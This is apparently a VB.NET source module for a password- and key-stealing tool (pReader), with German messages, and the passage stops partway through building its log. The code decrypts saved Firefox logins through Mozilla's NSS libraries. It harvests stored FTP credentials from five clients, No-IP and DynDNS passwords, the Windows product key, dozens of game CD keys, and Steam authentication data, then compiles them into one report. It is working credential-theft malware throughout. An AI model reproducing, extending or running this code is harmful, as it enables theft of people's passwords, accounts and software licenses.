﻿Imports System.IO
Imports System.Text
Imports System.Data
Imports Microsoft.Win32
Imports Lutscher.SQLiteWrapper
Imports System.Runtime.InteropServices

Module pReader
    Dim FileZilla As String = Nothing
    Dim NoIP As String = Nothing
    Dim Windows As String = Nothing
    Dim Seriallist As String = Nothing
    Dim ff As String = Nothing
    Dim steam As String = Nothing
    Dim dyndns As String = Nothing
    Dim fComand As String = Nothing
    Dim fflash As String = Nothing
    Dim fcore As String = Nothing
    Dim fsmart As String = Nothing

#Region " Firefox "
    Public Class SHITEMID
        Public Shared cb As Long
        Public Shared abID As Byte()
    End Class

    <StructLayout(LayoutKind.Sequential)> Public Structure TSECItem
        Public SECItemType As Integer
        Public SECItemData As Integer
        Public SECItemLen As Integer
    End Structure

    <DllImport("kernel32.dll")> Private Function LoadLibrary(ByVal dllFilePath As String) As IntPtr
    End Function

    Private NSS3 As IntPtr

    <DllImport("kernel32", CharSet:=CharSet.Ansi, ExactSpelling:=True, SetLastError:=True)> _
    Private Function GetProcAddress(ByVal hModule As IntPtr, ByVal procName As String) As IntPtr
    End Function

    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> Public Delegate Function DLLFunctionDelegate(ByVal configdir As String) As Long

    Public Function NSS_Init(ByVal configdir As String) As Long
        Dim MozillaPath As String = Environment.GetEnvironmentVariable("PROGRAMFILES") & "\Mozilla Firefox\"
        LoadLibrary(MozillaPath & "mozcrt19.dll")
        LoadLibrary(MozillaPath & "nspr4.dll")
        LoadLibrary(MozillaPath & "plc4.dll")
        LoadLibrary(MozillaPath & "plds4.dll")
        LoadLibrary(MozillaPath & "ssutil3.dll")
        LoadLibrary(MozillaPath & "sqlite3.dll")
        LoadLibrary(MozillaPath & "nssutil3.dll")
        LoadLibrary(MozillaPath & "softokn3.dll")
        NSS3 = LoadLibrary(MozillaPath & "nss3.dll")
        Dim pProc As IntPtr = GetProcAddress(NSS3, "NSS_Init")
        Dim dll As DLLFunctionDelegate = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate)), DLLFunctionDelegate)
        Return dll(configdir)
    End Function

    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> Public Delegate Function DLLFunctionDelegate2() As Long

    Public Function PK11_GetInternalKeySlot() As Long
        Dim pProc As IntPtr = GetProcAddress(NSS3, "PK11_GetInternalKeySlot")
        Dim dll As DLLFunctionDelegate2 = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate2)), DLLFunctionDelegate2)
        Return dll()
    End Function

    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> Public Delegate Function DLLFunctionDelegate3(ByVal slot As Long, ByVal loadCerts As Boolean, ByVal wincx As Long) As Long

    Public Function PK11_Authenticate(ByVal slot As Long, ByVal loadCerts As Boolean, ByVal wincx As Long) As Long
        Dim pProc As IntPtr = GetProcAddress(NSS3, "PK11_Authenticate")
        Dim dll As DLLFunctionDelegate3 = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate3)), DLLFunctionDelegate3)
        Return dll(slot, loadCerts, wincx)
    End Function

    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> Public Delegate Function DLLFunctionDelegate4(ByVal arenaOpt As IntPtr, ByVal outItemOpt As IntPtr, ByVal inStr As StringBuilder, ByVal inLen As Integer) As Integer

    Public Function NSSBase64_DecodeBuffer(ByVal arenaOpt As IntPtr, ByVal outItemOpt As IntPtr, ByVal inStr As StringBuilder, ByVal inLen As Integer) As Integer
        Dim pProc As IntPtr = GetProcAddress(NSS3, "NSSBase64_DecodeBuffer")
        Dim dll As DLLFunctionDelegate4 = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate4)), DLLFunctionDelegate4)
        Return dll(arenaOpt, outItemOpt, inStr, inLen)
    End Function

    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> Public Delegate Function DLLFunctionDelegate5(ByRef data As TSECItem, ByRef result As TSECItem, ByVal cx As Integer) As Integer

    Public Function PK11SDR_Decrypt(ByRef data As TSECItem, ByRef result As TSECItem, ByVal cx As Integer) As Integer
        Dim pProc As IntPtr = GetProcAddress(NSS3, "PK11SDR_Decrypt")
        Dim dll As DLLFunctionDelegate5 = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate5)), DLLFunctionDelegate5)
        Return dll(data, result, cx)
    End Function

    Public signon As String

    Sub sFirefox()
        Try
            Dim TEMP As String = System.IO.Path.GetTempPath
            Dim FoundFile As Boolean = False
            Dim KeySlot As Long = 0
            Dim MozillaPath As String = Environment.GetEnvironmentVariable("PROGRAMFILES") & "\Mozilla Firefox\"
            Dim DefaultPath As String = Environment.GetEnvironmentVariable("APPDATA") & "\Mozilla\Firefox\Profiles"
            Dim Dirs As String() = Directory.GetDirectories(DefaultPath)
            For Each dir As String In Dirs
                If Not FoundFile Then
                    Dim Files As String() = Directory.GetFiles(dir)
                    For Each CurrFile As String In Files
                        If Not FoundFile Then
                            If System.Text.RegularExpressions.Regex.IsMatch(CurrFile, "signons.sqlite") Then
                                NSS_Init(dir)
                                signon = CurrFile
                            End If
                        Else
                            Exit For
                        End If
                    Next
                Else
                    Exit For
                End If
            Next
            Dim dataSource As String = signon
            Dim tSec As New TSECItem()
            Dim tSecDec As New TSECItem()
            Dim tSecDec2 As New TSECItem()
            Dim bvRet As Byte()
            Dim db As New SQLiteBase(dataSource)
            Dim table As DataTable = db.ExecuteQuery("SELECT * FROM moz_logins;")
            Dim table2 As DataTable = db.ExecuteQuery("SELECT * FROM moz_disabledHosts;")
            For Each row As DataRow In table2.Rows
                ff = ff & vbNewLine & (row("hostname").ToString())
            Next
            KeySlot = PK11_GetInternalKeySlot()
            PK11_Authenticate(KeySlot, True, 0)
            For Each Zeile As System.Data.DataRow In table.Rows
                Dim formurl As String = System.Convert.ToString(Zeile("formSubmitURL").ToString())
                ff = ff & vbNewLine & ("URL: " & formurl)
                Dim se As New StringBuilder(Zeile("encryptedUsername").ToString())
                Dim hi2 As Integer = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, se, se.Length)
                Dim item As TSECItem = DirectCast(Marshal.PtrToStructure(New IntPtr(hi2), GetType(TSECItem)), TSECItem)
                If PK11SDR_Decrypt(item, tSecDec, 0) = 0 Then
                    If tSecDec.SECItemLen <> 0 Then
                        bvRet = New Byte(tSecDec.SECItemLen - 1) {}
                        Marshal.Copy(New IntPtr(tSecDec.SECItemData), bvRet, 0, tSecDec.SECItemLen)
                        ff = ff & vbNewLine & ("Username: " & System.Text.Encoding.ASCII.GetString(bvRet))
                    End If
                End If
                Dim se2 As New StringBuilder(Zeile("encryptedPassword").ToString())
                Dim hi22 As Integer = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, se2, se2.Length)
                Dim item2 As TSECItem = DirectCast(Marshal.PtrToStructure(New IntPtr(hi22), GetType(TSECItem)), TSECItem)
                If PK11SDR_Decrypt(item2, tSecDec2, 0) = 0 Then
                    If tSecDec2.SECItemLen <> 0 Then
                        bvRet = New Byte(tSecDec2.SECItemLen - 1) {}
                        Marshal.Copy(New IntPtr(tSecDec2.SECItemData), bvRet, 0, tSecDec2.SECItemLen)
                        ff = ff & vbNewLine & ("Passwort: " & System.Text.Encoding.ASCII.GetString(bvRet)) & vbNewLine
                    End If
                Else
                End If
            Next
        Catch ex As Exception
            ff = "Firefox konnte nicht ausgelesen werden!"
        End Try
    End Sub
#End Region

#Region " FileZilla "
    Sub SFilezilla()
        Dim sPath As String = Environ$("APPDATA") & "\FileZilla\sitemanager.xml"
        Dim sFile As String = ReadFile(sPath)
        Dim sHost As String = Cut(sFile, "<Host>", "</Host>")
        Dim sPort As String = Cut(sFile, "<Port>", "</Port>")
        Dim sUser As String = Cut(sFile, "<User>", "</User>")
        Dim sPwd As String = Cut(sFile, "<Pass>", "</Pass>")
        Dim sEntry As String = Cut(sFile, "<Name>", "</Name>")
        If Not sUser = "" Then
            Try
                FileZilla = "Entry: " + sEntry + vbNewLine + "Host: " + sHost + ":" + sPort + vbNewLine + "Username: " + sUser + vbNewLine + "Passwort: " + sPwd
            Catch ex As Exception
                FileZilla = "File Zilla konnte nicht ausgelesen werden!"
            End Try
        Else
            FileZilla = "File Zilla ist nicht installiert!"
        End If
    End Sub
#End Region

#Region "FTP Commander"
    Sub SCommander()
        Dim sPath As String = Replace(RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\FTP Commander\UninstallString"), "uninstall.exe", vbNullString) & "Ftplist.txt"
        Dim sFile As String = ReadLine(sPath, -1)
        Dim sHost As String = Cut(sFile, ";Server=", ";Port=")
        Dim sPort As String = Cut(sFile, ";Port=", ";Password=")
        Dim sUser As String = Cut(sFile, ";User=", ";Anonymous=")
        Dim sPwd As String = Cut(sFile, ";Password=", ";User=")
        Dim sEntry As String = Cut(sFile, "Name=", ";Server=")
        If Not sUser = "" Then
            Try
                fComand = "Entry: " + sEntry + vbNewLine + "Host: " + sHost + ":" + sPort + vbNewLine + "Username: " + sUser + vbNewLine + "Passwort: " + sPwd
            Catch ex As Exception
                fComand = "FTP Commander konnte nicht ausgelesen werden!"
            End Try
        Else
            fComand = "FTP Commander ist nicht installiert!"
        End If
    End Sub
#End Region

#Region "Flash FXP"
    Sub SFlashFxp()
        Dim sPath As String = Replace(Environ$("APPDATA"), Environ$("Username"), "All Users") & "\FlashFXP\" & "3" & "\quick.dat"
        Dim sFile As String = ReadFile(sPath)
        Dim sHost As String = Cut(sFile, "IP=", vbNewLine)
        Dim sPort As String = Cut(sFile, "port=", vbNewLine)
        Dim sUser As String = Cut(sFile, "user=", vbNewLine)
        Dim sPwd As String = Cut(sFile, "pass=", vbNewLine)
        Dim sEntry As String = Cut(sFile, "created=", vbNewLine)
        If Not sUser = "" Then
            Try
                fflash = "Entry: " + sEntry + vbNewLine + "Host: " + sHost + ":" + sPort + vbNewLine + "Username: " + sUser + vbNewLine + "Passwort: " + sPwd + " (Encrypt)"
            Catch ex As Exception
                fflash = "Flash FXP konnte nicht ausgelesen werden!"
            End Try
        Else
            fflash = "Flash FXP ist nicht installiert!"
        End If
    End Sub
#End Region

#Region "Core FTP"
    Sub ScoreFTP()
        Dim sPath As String = Environ$("APPDATA") & "\CoreFTP\sites.idx"
        Dim sFile As String = ReadFile(sPath)
        Dim sHost As String = RegRead("HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites\" & sFile & "\Host")
        Dim sPort As String = RegRead("HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites\" & sFile & "\Port")
        Dim sUser As String = RegRead("HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites\" & sFile & "\User")
        Dim sPwd As String = RegRead("HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites\" & sFile & "\PW")
        Dim sEntry As String = RegRead("HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites\" & sFile & "\Name")
        If Not sUser = "" Then
            Try
                fcore = "Entry: " + sEntry + vbNewLine + "Host: " + sHost + ":" + sPort + vbNewLine + "Username: " + sUser + vbNewLine + "Passwort: " + sPwd + " (Encrypt)"
            Catch ex As Exception
                fcore = "Core FTP konnte nicht ausgelesen werden!"
            End Try
        Else
            fcore = "Core FTP ist nicht installiert!"
        End If
    End Sub
#End Region

#Region "Smart FTP"
    Sub Ssmart()
        Dim sPath As String = Environ$("APPDATA") & "\SmartFTP\Client 2.0\Favorites\Quick Connect\" & Dir(Environ$("APPDATA") & "\SmartFTP\Client 2.0\Favorites\Quick Connect\*.xml")
        Dim sFile As String = ReadFile(sPath)
        Dim sHost As String = Cut(sFile, "<Host>", "</Host>")
        Dim sPort As String = Cut(sFile, "<Port>", "</Port>")
        Dim sUser As String = Cut(sFile, "<User>", "</User>")
        Dim sPwd As String = Cut(sFile, "<Password>", "</Password>")
        Dim sEntry As String = Cut(sFile, "<Name>", "</Name>")
        If Not sUser = "" Then
            Try
                fsmart = "Entry: " + sEntry + vbNewLine + "Host: " + sHost + ":" + sPort + vbNewLine + "Username: " + sUser + vbNewLine + "Passwort: " + sPwd + " (Encrypt)"
            Catch ex As Exception
                fsmart = "Smart FTP konnte nicht ausgelesen werden!"
            End Try
        Else
            fsmart = "Smart FTP ist nicht installiert!"
        End If
    End Sub
#End Region

#Region " Windows "
    Public Class GetCDKeyFromWindows
        Public Shared ReadOnly Property ReturnProductKey() As String
            Get
                Return GetCDKey()
            End Get
        End Property
        Private Shared Function GetCDKey() As String
            Dim tmp() As Byte
            ReDim Preserve tmp(14)
            Dim Valuename As String = "DigitalProductId"
            Dim Path As String = "Software\Microsoft\Windows NT\CurrentVersion"
            Dim n As Integer
            Try
                Dim hObject As Object = _
                    My.Computer.Registry.LocalMachine.OpenSubKey( _
                    Path, False).GetValue( _
                    Valuename, Nothing)

                If hObject.GetType() Is GetType(Byte()) Then
                    Dim Content() As Byte = CType(hObject, Byte())
                    For n = 52 To 66
                        tmp(n - 52) = Content(n)
                    Next
                End If
                Dim chars() As Byte = { _
                    Asc("B"), Asc("C"), Asc("D"), Asc("F"), Asc("G"), Asc("H"), Asc("J"), Asc("K"), _
                    Asc("M"), Asc("P"), Asc("Q"), Asc("R"), Asc("T"), Asc("V"), Asc("W"), Asc("X"), _
                    Asc("Y"), Asc("2"), Asc("3"), Asc("4"), Asc("6"), Asc("7"), Asc("8"), Asc("9")}
                Dim Current As Integer
                Dim Result As String = ""
                For n = chars.Length To 0 Step -1
                    Current = 0
                    For k As Integer = tmp.Length - 1 To 0 Step -1
                        Current = Current * 256 Xor tmp(k)
                        tmp(k) = CType(Int(Current / 24), Byte)
                        Current = Current Mod 24
                    Next
                    Result = Microsoft.VisualBasic.Strings.Chr(chars(Current)) & Result
                    If n Mod 5 = 0 And n <> 0 Then Result = "-" & Result
                Next
                Return Result
            Catch ex As Exception
                MessageBox.Show(ex.Message.ToString, "Info")
            End Try
            Return ""
        End Function
    End Class
    Sub SWindowskey()
        Try
            Dim key As String = GetCDKeyFromWindows.ReturnProductKey()
            Windows = key & vbNewLine
        Catch
            Windows = "Windows Serial konnte nicht ausgelesen werden!"
        End Try
    End Sub
#End Region

#Region " No-IP "
    Sub SNoip()
        Dim passwort As String = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC\", "Password", Nothing)
        Dim str As String = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC\", "Checked", Nothing)
        Dim str6 As String = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC\", "Username", Nothing)
        Dim str4 As String = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC\", "ProxyUsername", Nothing)
        Dim str5 As String = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC\", "ProxyPassword", Nothing)
        Dim str2 As String = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC\", "Hosts", Nothing)
        If Not str6 = "" Then
            Try
                NoIP = "Aktivierte Hosts: " & str & vbNewLine & "Alle Hosts: " & str2 & vbNewLine & "Username: " & str6 & vbNewLine & _
                "Passwort: " & FromBase64(passwort) & vbNewLine & "Proxy Username: " & str5 & vbNewLine & "Proxy Passwort: " & str4 & vbNewLine
            Catch ex As Exception
                NoIP = "NoIp konnte nicht ausgelesen werden!"
            End Try
        Else
            NoIP = "NoIp ist nicht installiert!"
        End If
    End Sub
#End Region

#Region "DynDns"
    Sub sDynDns()
        Dim sPath As String = Replace(Environ$("APPDATA"), Environ$("Username"), "All Users") & "\DynDNS\Updater\config.dyndns"
        Dim sFile As String = ReadFile(sPath)
        Dim sHost As String = Cut(sFile, "[Hosts]", "Count=")
        Dim sUser As String = Cut(sFile, "Username=", vbNewLine)
        Dim sPwd As String = Cut(sFile, "Password=", vbNewLine)
        If Not sPwd = "" Then
            Try
                dyndns = "Hosts:" & sHost & vbNewLine & "Username: " & sUser & vbNewLine & "Passwort: " & sPwd & " (Encrypt)"
            Catch ex As Exception
                dyndns = "DynDNS konnte nicht ausgelesen werden: Unbekannter Fehler!" & Environment.NewLine
            End Try
        Else
            dyndns = "DynDns ist nicht installiert!" & Environment.NewLine
        End If
    End Sub
#End Region

#Region "Serial"
    Function ReadReg(ByVal hKey As String) As String
        Dim wShell As Object = CreateObject("WScript.Shell")
        On Error Resume Next
        Return wShell.RegRead(hKey)
    End Function
    Sub SSerial()
        Try
            Dim Serial, hkey As String
            hkey = "HKEY_CURRENT_USER\Software\Eugen Systems\ActOfWar\RegNumber"
            If ReadReg(hkey) <> "" Then
                Serial = "Act of War: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\Software\Sunflowers\Anno 1701\SerialNo"
            If ReadReg(hkey) <> "" Then
                Serial = "Anno 1701: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\Software\Electronic Arts\EA GAMES\Battlefield 1942\ergc\"
            If ReadReg(hkey) <> "" Then
                Serial = "Battlefield 1942: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\Software\Electronic Arts\EA Games\Battlefield 2\ergc\"
            If ReadReg(hkey) <> "" Then
                Serial = "Battlefield 2: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\SOFTWARE\Electronic Arts\EA GAMES\Battlefield 2142\ergc\"
            If ReadReg(hkey) <> "" Then
                Serial = "Battlefield 2142: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\Software\Electronic Arts\EA GAMES\Battlefield Vietnam\ergc\"
            If ReadReg(hkey) <> "" Then
                Serial = "Battlefield Vietnam: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\Software\Electronic Arts\EA GAMES\Black and White\ergc\"
            If ReadReg(hkey) <> "" Then
                Serial = "Black and White: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\Software\Electronic Arts\EA GAMES\Black and White 2\ergc\"
            If ReadReg(hkey) <> "" Then
                Serial = "Black and White 2: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\Software\Activision\Call of Duty\codkey"
            If ReadReg(hkey) <> "" Then
                Serial = "Call of Duty: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\Software\Activision\Call of Duty 2\codkey"
            If ReadReg(hkey) <> "" Then
                Serial = "Call of Duty 2: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\Software\Activision\Call of Duty 4\codkey"
            If ReadReg(hkey) <> "" Then
                Serial = "Call of Duty 4: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\Software\Activision\Call of Duty WAW,codkey"
            If ReadReg(hkey) <> "" Then
                Serial = "Call of Duty 5: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\SOFTWARE\Electronic Arts\EA Games\Generals\ergc\"
            If ReadReg(hkey) <> "" Then
                Serial = "Command and Conquer: Generals: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\SOFTWARE\electronic arts\ea games\command and conquer generals zero hour\ergc\"
            If ReadReg(hkey) <> "" Then
                Serial = "Command and Conquer: Generals Zero Hour: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\SOFTWARE\westwood\tiberian sun\serial"
            If ReadReg(hkey) <> "" Then
                Serial = "Command and Conquer: Tiberian Sun: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\SOFTWARE\westwood\red alert\serial"
            If ReadReg(hkey) <> "" Then
                Serial = "Command and Conquer: Red Alert: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\SOFTWARE\Westwood\Red Alert 2\Serial"
            If ReadReg(hkey) <> "" Then
                Serial = "Command and Conquer: Red Alert 2: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\SOFTWARE\Westwood\Yuri's Revenge\Serial"
            If ReadReg(hkey) <> "" Then
                Serial = "Command and Conquer: Red Alert 2 Yuri's Revenge: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\SOFTWARE\Electronic Arts\Electronic Arts\Command and Conquer 3\ergc\"
            If ReadReg(hkey) <> "" Then
                Serial = "Command and Conquer 3: Tiberium Wars: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\Software\THQ\Company of Heroes\CoHProductKey"
            If ReadReg(hkey) <> "" Then
                Serial = "Company of Heroes: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\Software\Electronic Arts\Electronic Arts\Crysis\ergc\"
            If ReadReg(hkey) <> "" Then
                Serial = "Crysis: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\SOFTWARE\Techland\Chrome,SerialNumber"
            If ReadReg(hkey) <> "" Then
                Serial = "Chrome: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\SOFTWARE\CRYTEK\FARCRY\UBI.COM\CDKey"
            If ReadReg(hkey) <> "" Then
                Serial = "Far Cry: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\SOFTWARE\CRYTEK\FARCRY2\UBI.COM\CDKey"
            If ReadReg(hkey) <> "" Then
                Serial = "Far Cry 2: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\SOFTWARE\Sierra\CDKey"
            If ReadReg(hkey) <> "" Then
                Serial = "F.E.A.R: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\SOFTWARE\Electronic Arts\Electronic Arts\FIFA 08\ergc\"
            If ReadReg(hkey) <> "" Then
                Serial = "Fifa 08: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\Software\THQ\Frontlines: Fuel of War\ProductKey"
            If ReadReg(hkey) <> "" Then
                Serial = "Frontlines: Fuel of War: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "SOFTWARE\Electronic Arts\EA Games\Hellgate: London\ergc\"
            If ReadReg(hkey) <> "" Then
                Serial = "Hellgate: London: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\SOFTWARE\Electronic Arts\Medal of Honor Airborne\Product GUID"
            If ReadReg(hkey) <> "" Then
                Serial = "Medal of Honor: Airborne: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\Software\Electronic Arts\EA GAMES\Medal of Honor Allied Assault\egrc"
            If ReadReg(hkey) <> "" Then
                Serial = "Medal of Honor: Allied Assault: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\Software\Electronic Arts\EA GAMES\Medal of Honor Allied Assault Breakthrough\ergc\"
            If ReadReg(hkey) <> "" Then
                Serial = "Medal of Honor: Allied Assault: Breakth: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\Software\Electronic Arts\EA GAMES\Medal of Honor Allied Assault Spearhead\ergc\"
            If ReadReg(hkey) <> "" Then
                Serial = "Medal of Honor: Allied Assault: Spearhe: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\Software\Electronic Arts\EA Sports\NBA Live 08\ergc\"
            If ReadReg(hkey) <> "" Then
                Serial = "NBA 08: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\Software\Electronic Arts\EA GAMES\Need For Speed Underground\ergc\"
            If ReadReg(hkey) <> "" Then
                Serial = "Need For Speed Underground: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\SOFTWARE\Electronic Arts\EA Games\Need for Speed Underground 2\ergc\"
            If ReadReg(hkey) <> "" Then
                Serial = "Need For Speed Underground 2: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\SOFTWARE\Electronic Arts\Electronic Arts\Need for Speed Carbon\ergc\"
            If ReadReg(hkey) <> "" Then
                Serial = "Need For Speed Carbon: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\SOFTWARE\Electronic Arts\EA GAMES\Need for Speed Most Wanted\ergc\"
            If ReadReg(hkey) <> "" Then
                Serial = "Need For Speed Most Wanted: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\SOFTWARE\Electronic Arts\Electronic Arts\Need for Speed ProStreet\ergc\"
            If ReadReg(hkey) <> "" Then
                Serial = "Need For Speed Pro Street: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\SOFTWARE\id\Quake 4\CDKey"
            If ReadReg(hkey) <> "" Then
                Serial = "Quake 4: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\Software\GSC Game World\STALKER-SHOC\InstallCDKEY"
            If ReadReg(hkey) <> "" Then
                Serial = "S.T.A.L.K.E.R. - Shadow of Chernobyl: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\Software\Sierra\CDKey\swat4"
            If ReadReg(hkey) <> "" Then
                Serial = "S.W.A.T 4: " & ReadReg(hkey) & vbNewLine
            End If
            hkey = "HKEY_CURRENT_USER\Software\Unreal Technology\Installed Apps\UT2004\CDKey"
            If ReadReg(hkey) <> "" Then
                Serial = "Unreal Tournament 2004: " & ReadReg(hkey) & vbNewLine
            End If
            If Not Serial = "" Then
                Seriallist = Serial
            Else
                Seriallist = "Keine Game Serials gefunden!"
            End If
        Catch ex As Exception
        End Try
    End Sub
#End Region

#Region "Steam Benutzer"
    Sub sSteam()
        Try
            Dim SteamPfad As String, WindowsProductID As String, MachineGuid As String, ValveIO As String
            Dim UserPfad As String
            UserPfad = Registry.GetValue("HKEY_CURRENT_USER\Software\Valve\Steam", "SteamPath", Nothing)
            UserPfad = UserPfad & "\SteamApps"
            SteamPfad = UserPfad.Replace("/", "\")
            SteamPfad = UserPfad.Replace("\SteamApps", "")
            WindowsProductID = Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductId", Nothing)
            MachineGuid = Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography", "MachineGuid", Nothing)
            ValveIO = Registry.GetValue("HKEY_CURRENT_USER\Software\Valve\Half-Life\Settings", "io", Nothing)
            Dim Reader As New StreamReader(SteamPfad & "\ClientRegistry.blob")
            Dim ClientRegistryInhalt As String = CStr(Reader.ReadToEnd.ToString)
            Dim Suchanfang As Integer = ClientRegistryInhalt.IndexOf("Phrase", 1)
            Suchanfang += 40
            Dim HashLänge As Integer = Suchanfang
            HashLänge += 92
            Dim EndHash As String = CStr(Nothing)
            For i = Suchanfang To HashLänge
                EndHash = EndHash + ClientRegistryInhalt(Suchanfang)
                Suchanfang = Suchanfang + 1
            Next i
            steam = "STEAMPWSECTION" & Environment.NewLine & WindowsProductID & Environment.NewLine & MachineGuid & Environment.NewLine & ValveIO & Environment.NewLine & EndHash & Environment.NewLine & "STEAMPWSECTIONEND" & Environment.NewLine
        Catch ex As Exception
            steam = "Steam ist nicht installiert!"
        End Try
    End Sub
#End Region

#Region "Listen erstellung"
    Sub sAll()
        Dim username As String = System.Environment.UserName
        Dim ossystem As String = My.Computer.Info.OSFullName
        Dim datum As String = Format(DateTime.Now, "dd.MM.yyyy")
        Form1.txtpws.Text = Form1.txtpws.Text.Replace("&", Nothing)
        Try
            Form1.txtpws.Text &= ("==================================================" & vbNewLine)
            Form1.txtpws.Text &= ("============== System Informationen ==============" & vbNewLine)
            Form1.txtpws.Text &= ("==================================================" & vbNewLine)
            Form1.txtpws.Text &= ("Log vom: " & datum & vbNewLine)
            Form1.txtpws.Text &= ("Username: " & username & vbNewLine)
            Form1.txtpws.Text &= ("Betriebssystem: " & ossystem & vbNewLine & vbNewLine)

            Form1.txtpws.Text &= ("**************************************************" & vbNewLine)
            Form1.txtpws.Text &= ("***************** Mozilla Firefox ****************" & vbNewLine)
            Form1.txtpws.Text &= ("**************************************************" & vbNewLine & ff & vbNewLine & vbNewLine)

            Form1.txtpws.Text &= ("**************************************************" & vbNewLine)
            Form1.txtpws.Text &= ("******************* FTP Accounts *****************" & vbNewLine)
            Form1.txtpws.Text &= ("**************************************************" & vbNewLine & fcore & vbNewLine & vbNewLine & fsmart & vbNewLine & vbNewLine & fflash & vbNewLine & vbNewLine & FileZilla & vbNewLine & vbNewLine & fComand & vbNewLine & vbNewLine)

            Form1.txtpws.Text &= ("**************************************************" & vbNewLine)
            Form1.txtpws.Text &= ("******************* NoIp Accounts ****************" & vbNewLine)
            Form1.txtpws.Text &= ("**************************************************" & vbNewLine & NoIP & vbNewLine & vbNewLine)

            Form1.txtpws.Text &= ("**************************************************" & vbNewLine)
            Form1.txtpws.Text &= ("****************** DynDns Accounts ***************" & vbNewLine)
            Form1.txtpws.Text &= ("**************************************************" & vbNewLine & dyndns & vbNewLine & vbNewLine)

            Form1.txtpws.Text &= ("**************************************************" & vbNewLine)
            Form1.txtpws.Text &= ("****************** Windows Serials ***************" & vbNewLine)
            Form1.txtpws.Text &= ("**************************************************" & vbNewLine & Windows & vbNewLine & vbNewLine)

            Form1.txtpws.Text &= ("**************************************************" & vbNewLine)
